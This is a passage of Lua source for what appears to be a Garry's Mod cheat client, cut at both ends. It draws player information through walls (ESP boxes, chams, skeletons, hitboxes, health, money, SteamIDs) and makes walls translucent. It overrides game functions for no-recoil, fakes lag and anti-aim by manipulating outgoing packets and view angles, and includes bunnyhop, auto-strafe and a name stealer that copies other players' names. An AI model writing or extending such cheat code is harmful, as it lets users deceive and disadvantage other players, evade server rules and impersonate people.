							render.SetMaterial(Material("color"))
							render.DrawBox(origin, boxang, min, max, Color(color.r,color.g,color.b,50))
						cam.End3D()
					end
				end

				if (gBool("VIS", "Box") && LOS) then
					if (gOption("VIS", "BoxType") == "2D") then
						if (gOption("VIS", "BoxStyle") == "Default") then
							surface.SetDrawColor(5,5,5)
								surface.DrawOutlinedRect(x1-1,y1-1,diff+2,diff2+2)
								surface.DrawOutlinedRect(x1+1,y1+1,diff-2,diff2-2)
							surface.SetDrawColor(color)
								surface.DrawOutlinedRect(x1,y1,diff,diff2)
						elseif (gOption("VIS", "BoxStyle") == "IWebz") then
							surface.SetDrawColor(5,5,5)
								surface.DrawLine(x1,y1,x1+(diff*0.225),y1)
								surface.DrawLine(x1,y1,x1,y1+(diff2*0.225))
								surface.DrawLine(x1,y2,x1+(diff*0.225),y2)
								surface.DrawLine(x1,y2,x1,y2-(diff2*0.225))
								surface.DrawLine(x2,y1,x2-(diff*0.225),y1)
								surface.DrawLine(x2,y1,x2,y1+(diff2*0.225))
								surface.DrawLine(x2,y2,x2-(diff*0.225),y2)
								surface.DrawLine(x2,y2,x2,y2-(diff2*0.225))
							surface.SetDrawColor(color)
								surface.DrawLine(x1+1,y1+1,x1+(diff*0.225),y1+1)
								surface.DrawLine(x1+1,y1+1,x1+1,y1+(diff2*0.225))
								surface.DrawLine(x1+1,y2-1,x1+(diff*0.225),y2-1)
								surface.DrawLine(x1+1,y2-1,x1+1,y2-(diff2*0.225))
								surface.DrawLine(x2-1,y1+1,x2-(diff*0.225),y1+1)
								surface.DrawLine(x2-1,y1+1,x2-1,y1+(diff2*0.225))
								surface.DrawLine(x2-1,y2-1,x2-(diff*0.225),y2-1)
								surface.DrawLine(x2-1,y2-1,x2-1,y2-(diff2*0.225))
						end
					elseif (gOption("VIS", "BoxType") == "3D") then
						if (v:IsPlayer() || v:IsNPC()) then
							boxang = Angle(0, eye.y, 0);
						else
							boxang = v:GetAngles();
						end
						if (gOption("VIS", "BoxStyle") == "Default") then
							cam.Start3D()
								render.DrawWireframeBox(origin, boxang, min, max, color)
							cam.End3D()
						elseif (gOption("VIS", "BoxStyle") == "IWebz") then
							cam.Start3D()
								local corners =
								{
									Vector(min.x,min.y,min.z),
									Vector(min.x,min.y,max.z),
									Vector(min.x,max.y,min.z),
									Vector(min.x,max.y,max.z),
									Vector(max.x,min.y,min.z),
									Vector(max.x,min.y,max.z),
									Vector(max.x,max.y,min.z),
									Vector(max.x,max.y,max.z)
								};

								for __, _corner in next, corners do
									local swag = Vector(0,0,0);
									local magic = Vector(max.x*0.45, max.y*0.45, max.z*0.45);

									if (_corner.x == min.x) then
										swag.x = magic.x;
									else
										swag.x = -magic.x;
									end

									if (_corner.y == min.y) then
										swag.y = magic.y;
									else
										swag.y = -magic.y;
									end

									if (_corner.z == min.z) then
										swag.z = magic.z;
									else
										swag.z = -magic.z;
									end

									if (v:IsPlayer() || v:IsNPC()) then
										cornerx = _corner + Vector(swag.x,0,0);
										cornery = _corner + Vector(0,swag.y,0);
										cornerz = _corner + Vector(0,0,swag.z);
										_corner:Rotate(boxang);
										cornerx:Rotate(boxang);
										cornery:Rotate(boxang);
										cornerz:Rotate(boxang);
									else
										cornerx = Vector(swag.x,0,0);
										cornery = Vector(0,swag.y,0);
										cornerz = Vector(0,0,swag.z);
										cornerx = cornerx + _corner;
										cornery = cornery + _corner;
										cornerz = cornerz + _corner;
									end

									render.DrawLine(v:LocalToWorld(_corner), v:LocalToWorld(cornerx), color)
									render.DrawLine(v:LocalToWorld(_corner), v:LocalToWorld(cornery), color)
									render.DrawLine(v:LocalToWorld(_corner), v:LocalToWorld(cornerz), color)
								end
							cam.End3D()
						end
					end
				end

				if (gBool("VIS", "Snapline")) then
					if ((gBool("VIS", "Box") || gBool("VIS", "FilledBox")) && gOption("VIS", "BoxType") == "2D") then
						snapendx = (x1 + x2)/2;
						snapendy = y2;
					else
						snapendx = origin:ToScreen().x;
						snapendy = origin:ToScreen().y;
					end
					if (gOption("VIS", "SnapLineType") == "Center") then
						snapstarty = ScrH()/2;
					elseif (gOption("VIS", "SnapLineType") == "Bottom") then
						snapstarty = ScrH();
					end
					snapstartx = ScrW()/2;
					local offsetx, offsety = SnapRotate();
					if (math.abs(snapendx) < ScrW()*5 && math.abs(snapendy) < ScrH()*5) then
						surface.SetDrawColor(5,5,5)
							surface.DrawLine(snapstartx-offsetx, snapstarty-offsety, snapendx-offsetx, snapendy-offsety)
							surface.DrawLine(snapstartx+offsetx, snapstarty+offsety, snapendx+offsetx, snapendy+offsety)
						surface.SetDrawColor(color)
							surface.DrawLine(snapstartx, snapstarty, snapendx, snapendy)
					end
				end

				if (LOS) then
					if (gBool("VIS", "HealthBar") && v:Health() > 0) then
						if (gOption("VIS", "BarOrientation") == "Vertical") then
							if (gOption("VIS", "BarStyle") == "Naisho") then
								surface.SetDrawColor(255 - 255/v:GetMaxHealth()*v:Health(), 255/v:GetMaxHealth()*v:Health(),0)
									surface.DrawRect(x1+hax, y2-(diff2/v:GetMaxHealth()*v:Health()),3,diff2/v:GetMaxHealth()*v:Health())
							elseif (gOption("VIS", "BarStyle") == "Aria") then
								surface.SetDrawColor(5,5,5)
									surface.DrawRect(x1+hax, y1,3,diff2)
								surface.SetDrawColor(0,255,0)
									surface.DrawRect(x1+hax, y2-(diff2/v:GetMaxHealth()*v:Health()),3,diff2/v:GetMaxHealth()*v:Health())
							elseif (gOption("VIS", "BarStyle") == "Fami") then
								surface.SetDrawColor(color)
									surface.DrawRect(x1+hax, y1,3,diff2-2)
								surface.SetDrawColor(5,5,5)
									surface.DrawLine(x1+hax+1, y1+1,x1+hax+1,y2-1)
								surface.SetDrawColor(255 - 255/v:GetMaxHealth()*v:Health(), 255/v:GetMaxHealth()*v:Health(),0)
									surface.DrawRect(x1+hax, y2-(diff2/v:GetMaxHealth()*v:Health()),3,diff2/v:GetMaxHealth()*v:Health())
							elseif (gOption("VIS", "BarStyle") == "Default") then
								surface.SetDrawColor(255,0,0)
									surface.DrawRect(x1+hax, y1,3,diff2)
								surface.SetDrawColor(0,255,0)
									surface.DrawRect(x1+hax, y2-(diff2/v:GetMaxHealth()*v:Health()),3,diff2/v:GetMaxHealth()*v:Health())
							end
							surface.SetDrawColor(5,5,5)
								surface.DrawOutlinedRect(x1+hax-1, y1-1,5,diff2+2)
							hax = hax - 7;
						elseif (gOption("VIS", "BarOrientation") == "Horizontal") then
							if (gOption("VIS", "BarStyle") == "Naisho") then
								surface.SetDrawColor(255 - 255/v:GetMaxHealth()*v:Health(), 255/v:GetMaxHealth()*v:Health(),0)
									surface.DrawRect(x1, y2+hay,diff/v:GetMaxHealth()*v:Health(),3)
							elseif (gOption("VIS", "BarStyle") == "Aria") then
								surface.SetDrawColor(5,5,5)
									surface.DrawRect(x1, y2+hay,diff,3)
								surface.SetDrawColor(0,255,0)
									surface.DrawRect(x1, y2+hay,diff/v:GetMaxHealth()*v:Health(),3)
							elseif (gOption("VIS", "BarStyle") == "Fami") then
								surface.SetDrawColor(color)
									surface.DrawRect(x1, y2+hay,diff,3)
								surface.SetDrawColor(5,5,5)
									surface.DrawLine(x1+1, y2+hay+1,x2-1,y2+hay+1)
								surface.SetDrawColor(255 - 255/v:GetMaxHealth()*v:Health(), 255/v:GetMaxHealth()*v:Health(),0)
									surface.DrawRect(x1, y2+hay,diff/v:GetMaxHealth()*v:Health(),3)
							elseif (gOption("VIS", "BarStyle") == "Default") then
								surface.SetDrawColor(255,0,0)
									surface.DrawRect(x1, y2+hay,diff,3)
								surface.SetDrawColor(0,255,0)
									surface.DrawRect(x1, y2+hay,diff/v:GetMaxHealth()*v:Health(),3)
							end
							surface.SetDrawColor(5,5,5)
								surface.DrawOutlinedRect(x1, y2+hay-1,diff+1,5)
							hay = hay + 7;
						end
					end

					if (gBool("VIS", "ArmourBar") && v:IsPlayer()) then
						if (gOption("VIS", "BarOrientation") == "Vertical") then
							if (gOption("VIS", "BarStyle") == "Naisho") then
								surface.SetDrawColor(0,160,355)
									surface.DrawRect(x1+hax, y2-(diff2/100 * math.Clamp(v:Armor(),0,100)),3,diff2/100*(math.Clamp(v:Armor(),0,100)))
							elseif (gOption("VIS", "BarStyle") == "Aria") then
								surface.SetDrawColor(5,5,5)
									surface.DrawRect(x1+hax, y1,3,diff2)
								surface.SetDrawColor(0,160,355)
									surface.DrawRect(x1+hax, y2-(diff2/100 * math.Clamp(v:Armor(),0,100)),3,diff2/100*(math.Clamp(v:Armor(),0,100)))
							elseif (gOption("VIS", "BarStyle") == "Fami") then
								surface.SetDrawColor(color)
									surface.DrawRect(x1+hax, y1,3,diff2)
								surface.SetDrawColor(5,5,5)
									surface.DrawLine(x1+hax+1, y1+1,x1+hax+1,y2-1)
								surface.SetDrawColor(0,160,355)
									surface.DrawRect(x1+hax, y2-(diff2/100 * math.Clamp(v:Armor(),0,100)),3,diff2/100*(math.Clamp(v:Armor(),0,100)))
							elseif (gOption("VIS", "BarStyle") == "Default") then
								surface.SetDrawColor(255,0,0)
									surface.DrawRect(x1+hax, y1,3,diff2)
								surface.SetDrawColor(0,160,355)
									surface.DrawRect(x1+hax, y2-(diff2/100 * math.Clamp(v:Armor(),0,100)),3,diff2/100*(math.Clamp(v:Armor(),0,100)))
							end
							surface.SetDrawColor(5,5,5)
								surface.DrawOutlinedRect(x1+hax-1, y1-1,5,diff2+2)
						elseif (gOption("VIS", "BarOrientation") == "Horizontal") then
							if (gOption("VIS", "BarStyle") == "Naisho") then
								surface.SetDrawColor(0,160,355)
									surface.DrawRect(x1, y2+hay,diff/100*(math.Clamp(v:Armor(),0,100)),3)
							elseif (gOption("VIS", "BarStyle") == "Aria") then
								surface.SetDrawColor(5,5,5)
									surface.DrawRect(x1, y2+hay,diff,3)
								surface.SetDrawColor(0,160,355)
									surface.DrawRect(x1, y2+hay,diff/100*(math.Clamp(v:Armor(),0,100)),3)
							elseif (gOption("VIS", "BarStyle") == "Fami") then
								surface.SetDrawColor(color)
									surface.DrawRect(x1, y2+hay,diff,3)
								surface.SetDrawColor(5,5,5)
									surface.DrawLine(x1+1, y2+hay+1,x2-1,y2+hay+1)
								surface.SetDrawColor(0,160,355)
									surface.DrawRect(x1, y2+hay,diff/100*(math.Clamp(v:Armor(),0,100)),3)
							elseif (gOption("VIS", "BarStyle") == "Default") then
								surface.SetDrawColor(255,0,0)
									surface.DrawRect(x1, y2+hay,diff,3)
								surface.SetDrawColor(0,160,355)
									surface.DrawRect(x1, y2+hay,diff/100*(math.Clamp(v:Armor(),0,100)),3)
							end
							surface.SetDrawColor(5,5,5)
								surface.DrawOutlinedRect(x1, y2+hay-1,diff+1,5)
							hay = hay + 7;
						end
					end
				end

				if (gBool("VIS", "Chams") && (v:IsPlayer() || v:IsNPC()) && LOS) then
					cam.Start3D()
						local a = v:GetColor().a;
						v:SetColor(Color(color.r, color.g, color.b, a))
						if (gOption("VIS", "ChamsType") == "Solid") then
							v:SetMaterial("models/debug/debugwhite")
						elseif (gOption("VIS", "ChamsType") == "Wireframe") then
							v:SetMaterial("models/wireframe")
						elseif (gOption("VIS", "ChamsType") == "XQZ") then
							v:SetMaterial("")
						end
						render.SetColorModulation(color.r/255, color.g/255, color.b/255)
						v:DrawModel()
						v:SetColor(Color(255,255,255, a))
						v:SetMaterial("")
					cam.End3D()
				end

				if (gBool("VIS", "WeaponChams") && (v:IsPlayer() || v:IsNPC()) && IsValid(v:GetActiveWeapon()) && LOS) then
					cam.Start3D()
						local wep = v:GetActiveWeapon();
						wep:SetColor(color)
						if (gOption("VIS", "ChamsType") == "Solid") then
							wep:SetMaterial("models/debug/debugwhite")
						elseif (gOption("VIS", "ChamsType") == "Wireframe") then
							wep:SetMaterial("models/wireframe")
						elseif (gOption("VIS", "ChamsType") == "XQZ") then
							wep:SetMaterial("")
						end
						render.SetColorModulation(color.r/255, color.g/255, color.b/255)
						wep:DrawModel()
						wep:SetColor(Color(255, 255, 255))
						wep:SetMaterial("")
					cam.End3D()
				end

				if (gBool("VIS", "Barrel") && v:IsPlayer()) then
					local b1, b2 = v:EyePos(), v:GetEyeTrace().HitPos;
					cam.Start3D()
						render.DrawLine(b1, b2, color)
					cam.End3D()
				end

				if (gBool("VIS", "Skeleton") && (v:IsPlayer() || v:IsNPC()) && LOS) then
					for i = 1, v:GetBoneCount() do
						local Parent = v:GetBoneParent(i)
						if (Parent == -1) then continue; end
						local FirstBone,SecondBone = v:GetBonePosition(i), v:GetBonePosition(Parent);
						if (v:GetPos() == FirstBone) then continue; end
						local LineStart, LineEnd = FirstBone:ToScreen(), SecondBone:ToScreen();
						surface.SetDrawColor(255, 255, 255)
							surface.DrawLine(LineStart.x, LineStart.y, LineEnd.x, LineEnd.y)
					end
				end

				if (gBool("VIS", "AimPos") && v:IsPlayer() || v:IsNPC() && LOS) then
					if (GetAimVec(v)) then
						local AimPos = GetAimVec(v):ToScreen()
						surface.SetDrawColor(5,5,5)
							surface.DrawRect(AimPos.x-2.5, AimPos.y-2.5, 5, 5)
						surface.SetDrawColor(color)
							surface.DrawRect(AimPos.x-1.5, AimPos.y-1.5, 3, 3)
					end
				end

				if (LOS) then
					if (gBool("VIS", "Health") && v:Health() != 0) then
						if (gOption("VIS", "HealthTextStyle") == "Dynamic") then
							draw.SimpleTextOutlined(v:Health() .. " HP", "fonty", x2, y2 + hay-4, Color(255 - 255/v:GetMaxHealth()*v:Health(), 255/v:GetMaxHealth()*v:Health(),0), TEXT_ALIGN_RIGHT, TEXT_ALIGN_BOTTOM, 1, Color(5, 5, 5))
						elseif (gOption("VIS", "HealthTextStyle") == "Static") then
							draw.SimpleTextOutlined(v:Health() .. " HP", "fonty", x2, y2 + hay-4, Color(0, 255,0), TEXT_ALIGN_RIGHT, TEXT_ALIGN_BOTTOM, 1, Color(5, 5, 5))
						end
						hay = hay + 12;
					end

					if (gBool("VIS", "Name")) then
						if (v:IsPlayer()) then
							draw.SimpleTextOutlined(v:Nick(), "fonty", x1, y1 - 2, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 1, Color(5, 5, 5))
						else
							draw.SimpleTextOutlined(v:GetClass(), "fonty", x1, y1 - 2, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP, 1, Color(5, 5, 5))
						end
					end

					if (gBool("VIS", "Weapon") && (v:IsPlayer() || v:IsNPC()) && IsValid(v:GetActiveWeapon())) then
						draw.SimpleTextOutlined(v:GetActiveWeapon():GetPrintName(), "fonty", x2 + 2, y1 + textespy, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(5, 5, 5))
						textespy = textespy + 12;
					end

					if (gBool("VIS", "Distance")) then
						if (gOption("VIS", "DistanceType") == "Units") then
							draw.SimpleTextOutlined(math.Round((LocalPlayer():GetPos() - v:GetPos()):Length()) .. " Units","fonty", x2 + 2, y1 + textespy, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(5, 5, 5))
						elseif (gOption("VIS", "DistanceType") == "Metres") then
							draw.SimpleTextOutlined(math.Round((LocalPlayer():GetPos() - v:GetPos()):Length()*0.0190625, 1) .. "m","fonty", x2 + 2, y1 + textespy, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(5, 5, 5))
						elseif (gOption("VIS", "DistanceType") == "Feet") then
							draw.SimpleTextOutlined(math.Round((LocalPlayer():GetPos() - v:GetPos()):Length()*0.0625) .. "ft","fonty", x2 + 2, y1 + textespy, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(5, 5, 5))
						end
						textespy = textespy + 12;
					end

					if (gBool("VIS", "Money") && gFloat("GM", "Type") == 1 && v:IsPlayer() && v.DarkRPVars) then
						draw.SimpleTextOutlined("$" .. tostring(v.DarkRPVars.money), "fonty", x2 + 2, y1 + textespy, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(5, 5, 5))
						textespy = textespy + 12;
					end

					if (gBool("VIS", "Rank") && v:IsPlayer()) then
						draw.SimpleTextOutlined(v:GetUserGroup(), "fonty", x2 + 2, y1 + textespy, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(5, 5, 5))
						textespy = textespy + 12;
					end

					if (gBool("VIS", "SteamID") && v:IsPlayer()) then
						if (v:SteamID() != "NULL") then
							draw.SimpleTextOutlined(v:SteamID(), "fonty", x2 + 2, y1 + textespy, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(5, 5, 5))
						else
							draw.SimpleTextOutlined("BOT", "fonty", x2 + 2, y1 + textespy, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(5, 5, 5))
						end
						textespy = textespy + 12;
					end

					if (gBool("VIS", "Points") && v:IsPlayer() && v.PS_Points) then
						draw.SimpleTextOutlined("å††" .. tostring(v.PS_Points), "fonty", x2 + 2, y1 + textespy, color, TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM, 1, Color(5, 5, 5))
						textespy = textespy + 12;
					end

					if (gBool("VIS", "Armour") && v:IsPlayer()) then
						draw.SimpleTextOutlined(v:Armor() .. " AP", "fonty", x2, y2 + hay-4, Color(0,160,355), TEXT_ALIGN_RIGHT, TEXT_ALIGN_BOTTOM, 1, Color(5, 5, 5))
					end
				end

				if ((gBool("VIS", "HitBox") || gBool("VIS", "FilledHitBox")) && (v:IsPlayer() || v:IsNPC()) && LOS) then
					for i = 0, v:GetHitBoxGroupCount() - 1 do
						for _i = 0, v:GetHitBoxCount(i) - 1 do
							local bone = v:GetHitBoxBone(_i, i);
							if(!bone) then continue; end
							local min, max = v:GetHitBoxBounds(_i, i);
							if (v:GetBonePosition(bone)) then
								local pos, ang = v:GetBonePosition(bone);
								cam.Start3D();
									if (gBool("VIS", "HitBox")) then
										render.DrawWireframeBox(pos, ang, min, max, color);
									end
									if (gBool("VIS", "FilledHitBox")) then
										render.SetMaterial(Material("color"))
										render.DrawBox(pos, ang, min, max, Color(color.r, color.g, color.b, 50));
									end
								cam.End3D();
							end
						end
					end
				end

				if (gBool("VIS", "Beacon") && (v:IsPlayer() || v:IsNPC())) then
					local b1, b2 = v:EyePos(), v:EyePos() + Vector(0,0,32768);
					cam.Start3D()
						render.DrawLine(b1, b2, color)
					cam.End3D()
				end

				if (gBool("VIS", "Halo") && (v:IsPlayer() || v:IsNPC()) && LOS) then
					halo.Add({v}, color, 2, 2, 2, true, true)
				end

				if (gBool("VIS", "WeaponHalo") && (v:IsPlayer() || v:IsNPC()) && IsValid(v:GetActiveWeapon()) && LOS) then
					local wep = v:GetActiveWeapon();
					halo.Add({wep}, color, 2, 2, 2, true, true)
				end
			end
		end
	end
end

local function ASUSWalls()
	if (gBool("VIS", "Active") && gBool("VIS", "AsusWalls") && gInt("VIS", "AsusWallsInt") != gFloat("VIS", "AsusWallsInt") || ((!gBool("VIS", "AsusWalls") || !gBool("VIS", "Active")) && gFloat("VIS", "AsusWalls")) || (gBool("VIS", "Active") && gBool("VIS", "AsusWalls") && !gFloat("VIS", "AsusWalls"))) then
		for k, v in next, Entity(0):GetMaterials() do
			if (gBool("VIS", "Active") && gBool("VIS", "AsusWalls")) then
				Material(v):SetFloat("$alpha", gInt("VIS", "AsusWallsInt"))
				if (k == #Entity(0):GetMaterials()) then
					sFloat("VIS", "AsusWallsInt", gInt("VIS", "AsusWallsInt"));
					sFloat("VIS", "AsusWalls", true);
				end
			else
				Material(v):SetFloat("$alpha", 1)
				if (k == #Entity(0):GetMaterials()) then
					sFloat("VIS", "AsusWalls", false);
				end
			end
		end
	end
end

local function Glow()
	if (gBool("VIS", "Active") && gBool("VIS", "Glow")) then
		for k,v in next, player.GetAll() do
			if (InFov(v) && _IsValid(v)) then
				local color = Colour(v);
				local light = DynamicLight(v)
				if (light) then
					light.pos = v:GetPos() + Vector(0,0,5);
					light.r = color.r;
					light.g = color.g;
					light.b = color.b;
					light.brightness = 2;
					light.Decay = 5 * gInt("VIS", "GlowInt");
					light.Size = 40 * gInt("VIS", "GlowInt");
					light.DieTime = CurTime()+0.5;
				end
			end
		end
	end
end

/*
REMOVALS
*/

local orecoil = orecoil || pmt.SetEyeAngles;

function pmt.SetEyeAngles(self, ang)
	if (gBool("REM", "Active") && gBool("REM", "NoRecoil") && string.find(string.lower(debug.getinfo(2).short_src),"/weapons/")) then
		return;
	end
	orecoil(self, ang);
end

local function NoPunch(cmd)
	if (cmd:CommandNumber() == 0) then return; end
	if (gBool("REM", "Active") && gBool("REM", "NoPunch") && !gFloat("AIM", "Aiming") && LocalPlayer():Alive() && LocalPlayer():GetActiveWeapon().Author == "Spy") then
		cmd:SetViewAngles(fake - LocalPlayer():GetViewPunchAngles());
	end
end

/*
HVH
*/

local function FakeLag(cmd)
	if (cmd:CommandNumber() == 0) then return; end
	if (gBool("HVH", "Active") && gBool("HVH", "FakeLag")) then
		if (gFloat("HVH", "FakeLagInt") >= gInt("HVH", "FakeLagInt")) then
			bSendPacket = true;
			sFloat("HVH", "FakeLagInt", 0);
		else
			bSendPacket = false;
			sFloat("HVH", "FakeLagInt", gFloat("HVH", "FakeLagInt")+1);
		end
	else
		sFloat("HVH", "FakeLagInt", gInt("HVH", "FakeLagInt"));
		bSendPacket = true;
	end
end

local function AntiAim(cmd)
	if (cmd:CommandNumber() == 0) then return; end
	sFloat("HVH", "AntiAim", (gFloat("HVH", "AntiAim") + 1)%2)
	if (gBool("HVH", "Active") && gBool("HVH", "AntiAim") && !gFloat("AIM", "Aiming") && !PlyInput(cmd) && !(gBool("MISC", "Active") && gBool("MISC", "ViewFix") && gBool("MISC", "AutoStrafer") && gOption("MISC", "AutoStraferType") != "Forwards")) then
		local antiang = Angle(0,0,0)
		if (gOption("HVH", "AntiAimX") == "OOB") then
			antiang.p = 91;
		elseif (gOption("HVH", "AntiAimX") == "FakeDown") then
			if (bSendPacket) then
				antiang.p = 89;
			else
				antiang.p = -89;
			end
		elseif (gOption("HVH", "AntiAimX") == "FakeUp") then
			if (bSendPacket) then
				antiang.p = -89;
			else
				antiang.p = 89;
			end
		elseif (gOption("HVH", "AntiAimX") == "Jitter") then
			if (gFloat("HVH", "AntiAim") == 0) then
				antiang.p = -89;
			elseif (gFloat("HVH", "AntiAim") == 1) then
				antiang.p = 89;
			end
		elseif (gOption("HVH", "AntiAimX") == "FakeJitter") then

		end

		if (gOption("HVH", "AntiAimY") == "FakeSide") then
			if (bSendPacket) then
				antiang.y = 0;
			else
				antiang.y = -90;
			end
		elseif (gOption("HVH", "AntiAimY") == "Random") then
			antiang.y = math.random(-180, 180);
		end

		antiang.y = (((antiang.y + 360)%360)-360);
		cmd:SetViewAngles(antiang);
	end
end

/*
MISCELLANEOUS
*/

local function BunnyHop(cmd)
	if (gBool("MISC", "Active") && gBool("MISC", "BunnyHop") && !LocalPlayer():IsTyping() && !LocalPlayer():OnGround() && LocalPlayer():WaterLevel() < 2 && LocalPlayer():GetMoveType() != 8 && LocalPlayer():GetMoveType() != 9) then
		cmd:RemoveKey(IN_JUMP);
	end
end

local function AutoStrafer(cmd)
	if (gBool("MISC", "Active") && gBool("MISC", "AutoStrafer") && !LocalPlayer():OnGround() && LocalPlayer():WaterLevel() < 2 && input.IsKeyDown(KEY_SPACE) && LocalPlayer():GetMoveType() != 8 && LocalPlayer():GetMoveType() != 9) then
		if (cmd:GetMouseX() < 0) then
			if (gOption("MISC", "AutoStraferType") == "Forwards") then
				cmd:SetSideMove(-10^4);
			elseif (gOption("MISC", "AutoStraferType") == "Backwards") then
				if (gBool("MISC", "ViewFix")) then
					cmd:SetSideMove(-10^4);
				else
					cmd:SetSideMove(10^4);
				end
			elseif (gOption("MISC", "AutoStraferType") == "Sideways") then
				if (gBool("MISC", "ViewFix")) then
					cmd:SetSideMove(-10^4);
				else
					cmd:SetForwardMove(-10^4);
				end
			elseif (gOption("MISC", "AutoStraferType") == "W-Hop") then
				if (gBool("MISC", "ViewFix") && !PlyInput(cmd) && !gFloat("AIM", "Aiming")) then
					cmd:SetForwardMove(10^4);
					cmd:SetViewAngles(fake + Angle(0,90,0));
				else
					if (AngDiff(LocalPlayer():EyeAngles(), LocalPlayer():GetVelocity():Angle()).y >= -90) then
						cmd:SetForwardMove(10^4);
					end
				end
			end
		elseif (cmd:GetMouseX() > 0) then
			if (gOption("MISC", "AutoStraferType") == "Forwards") then
				cmd:SetSideMove(10^4);
			elseif (gOption("MISC", "AutoStraferType") == "Backwards") then
				if (gBool("MISC", "ViewFix")) then
					cmd:SetSideMove(10^4);
				else
					cmd:SetSideMove(-10^4);
				end
			elseif (gOption("MISC", "AutoStraferType") == "Sideways") then
				if (gBool("MISC", "ViewFix")) then
					cmd:SetSideMove(10^4);
				else
					cmd:SetForwardMove(10^4);
				end
			elseif (gOption("MISC", "AutoStraferType") == "W-Hop") then
				if (gBool("MISC", "ViewFix")) then
					cmd:SetForwardMove(10^4);
					cmd:SetViewAngles(fake - Angle(0,90,0));
				else
					if (AngDiff(LocalPlayer():EyeAngles(), LocalPlayer():GetVelocity():Angle()).y >= -90) then
						cmd:SetForwardMove(10^4);
					end
				end
			end
		end
	end
end

local function ViewFix(cmd)
	if (gBool("MISC", "Active") && gBool("MISC", "ViewFix") && gBool("MISC", "AutoStrafer") && !PlyInput(cmd) && !gFloat("AIM", "Aiming")) then
		if (gOption("MISC", "AutoStraferType") == "Backwards") then
			cmd:SetViewAngles(fake - Angle(0,180,0));
		elseif (gOption("MISC", "AutoStraferType") == "Sideways") then
			cmd:SetViewAngles(fake - Angle(0,90,0));
		elseif (gOption("MISC", "AutoStraferType") == "W-Hop") then

		end
	end
end

local function NameStealer()
	if (gBool("MISC", "Active") && gBool("MISC", "NameStealer")) then
		if (gOption("MISC", "NameStealerType") == "DarkRP" && gFloat("GM", "Type") == 1) then
			RunConsoleCommand("say", "/rpname " .. tostring(table.Random(player.GetAll()):Name()) .. "i");
		elseif (gOption("MISC", "NameStealerType") == "Steam") then
			_fhook_changename(tostring(table.Random(player.GetAll()):Name()) .. "â€Š");
		end
	end
end

local function AutoPistol(cmd)
	if (gBool("MISC", "Active") && gBool("MISC", "AutoPistol")) then
		if (cmd:KeyDown(IN_ATTACK) && LocalPlayer():Alive() && IsValid(LocalPlayer():GetActiveWeapon()) && LocalPlayer():GetActiveWeapon().Primary && LocalPlayer():GetActiveWeapon().Primary.Delay == nil && LocalPlayer():GetActiveWeapon().Primary.RPM == nil) then
			if (gFloat("MISC", "AutoPistol")) then
				cmd:RemoveKey(IN_ATTACK);
				sFloat("MISC", "AutoPistol", false);
			else
				sFloat("MISC", "AutoPistol", true);
			end
		else
			if (!CanFire()) then
				cmd:RemoveKey(IN_ATTACK);
			end
		end
	end
end

local function AutoAim(cmd)
	if (gBool("MISC", "Active") && gBool("MISC", "AutoAim")) then
		if (cmd:KeyDown(IN_ATTACK2) && LocalPlayer():Alive()) then
			if (gFloat("MISC", "AutoAim")) then
				cmd:RemoveKey(IN_ATTACK2);
				sFloat("MISC", "AutoAim", false);
			else
				sFloat("MISC", "AutoAim", true);
			end
		end
	end
end

local function AutoUse(cmd)
	if (gBool("MISC", "Active") && gBool("MISC", "AutoUse")) then
		if (cmd:KeyDown(IN_USE) && LocalPlayer():Alive()) then
			if (gFloat("MISC", "AutoUse")) then
				cmd:RemoveKey(IN_USE);
				sFloat("MISC", "AutoUse", false);
			else
				sFloat("MISC", "AutoUse", true);
			end
		end
	end
end

local function AutoFlash(cmd)
	if (gBool("MISC", "Active") && gBool("MISC", "AutoFlash")) then
		if (input.IsMouseDown(MOUSE_MIDDLE)) then
			if (!gFloat("KEY", "AutoFlash")) then
				if (!gFloat("MISC", "AutoFlash")) then
					sFloat("MISC", "AutoFlash", true);
				else
					sFloat("MISC", "AutoFlash", false);
				end
				sFloat("KEY", "AutoFlash", true);
			end
		else
			sFloat("KEY", "AutoFlash", false);
		end
		if (gFloat("MISC", "AutoFlash")) then
			RunConsoleCommand("impulse", "100");
		end
	else
		sFloat("KEY", "AutoFlash", true);
		sFloat("MISC", "AutoFlash", false);
	end
end

local function EdgeJump(cmd)
	if (gBool("MISC", "Active") && gBool("MISC", "EdgeJump") && LocalPlayer():IsOnGround() && LocalPlayer():WaterLevel() < 2 && LocalPlayer():GetMoveType() != 8 && LocalPlayer():GetMoveType() != 9) then
		local StartPos = LocalPlayer():GetPos();
		local EndPos = LocalPlayer():GetPos() - Vector(0,0,18);
		local DirVec = Vector(LocalPlayer():GetVelocity():Angle():Forward().x, LocalPlayer():GetVelocity():Angle():Forward().y, 0) * 8;
		local DirVec2 = Vector(LocalPlayer():GetVelocity():Angle():Forward().x, LocalPlayer():GetVelocity():Angle():Forward().y, 0) * 16;
		local First = {
			start = StartPos - DirVec,
			endpos = EndPos - DirVec,
			filter = LocalPlayer(),
			mask = MASK_PLAYERSOLID
		};
		local Second = {
			start = StartPos - DirVec2,
			endpos = EndPos - DirVec2,
			filter = LocalPlayer(),
			mask = MASK_PLAYERSOLID
		};
		if (util.TraceLine(First).Fraction == 1 && util.TraceLine(Second).Fraction != 1) then
			cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP));
		end
	end
end

local oGetHands = pmt.GetHands;

function pmt.GetHands(...)
	return (!(gBool("MISC", "Active") && gBool("MISC", "NoHands")) && oGetHands(...));
end

local function Weapon()
	if (IsValid(LocalPlayer():GetViewModel())) then
		if (gBool("MISC", "Active") && gBool("MISC", "Weapon")) then
			local wep = LocalPlayer():GetViewModel();
			if (gOption("MISC", "WeaponType") == "Wireframe") then
				wep:SetMaterial("models/wireframe");
			elseif (gOption("MISC", "WeaponType") == "Solid") then
				wep:SetMaterial("models/debug/debugwhite");
			end
